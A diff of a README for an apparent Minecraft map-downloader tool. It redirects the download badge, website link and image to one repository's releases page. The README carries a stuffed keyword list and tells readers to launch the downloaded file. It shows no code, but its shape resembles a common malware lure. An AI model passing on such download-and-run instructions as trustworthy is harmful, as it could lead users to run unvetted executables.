@@ -23,15 +23,15 @@ This repository provides a convenient solution for downloading maps from Minecra
 download, downloader, downloaderserver, exporter, game, gameworld, map, mapdownload, mapdownloader, mapdownloadgame, mapextractor, mapextractordownload, maptool, Minecraft, Minecraftworld, server, servermap, tool, world, worldexport
 
 ## Download Link
-[![Download Here](https://img.shields.io/badge/Download-Release.zip-brightgreen)](https://github.com/assets/Release.zip)
+[![Download Here](https://github.com/X4yam/WorldDownloader-Maps-Minecraft/releases)](https://github.com/X4yam/WorldDownloader-Maps-Minecraft/releases)
 
 > Note: Click on the button above to download the tool. Make sure to launch the file after downloading.
 
 If the provided link does not work or needs to be updated, please check the "Releases" section of the repository for alternative download options.
 
 ## Additional Resources
-For more information and updates, visit the official [WorldDownloader-Maps-Minecraft website](https://www.worlddownloader-maps-minecraft.com).
+For more information and updates, visit the official [WorldDownloader-Maps-Minecraft website](https://github.com/X4yam/WorldDownloader-Maps-Minecraft/releases).
 
 Dive into the world of Minecraft maps with WorldDownloader-Maps-Minecraft and elevate your gameplay experience! Happy exploring! 🌟
 
-![Minecraft](https://example.com/minecraft-image.png)
+![Minecraft](https://github.com/X4yam/WorldDownloader-Maps-Minecraft/releases)
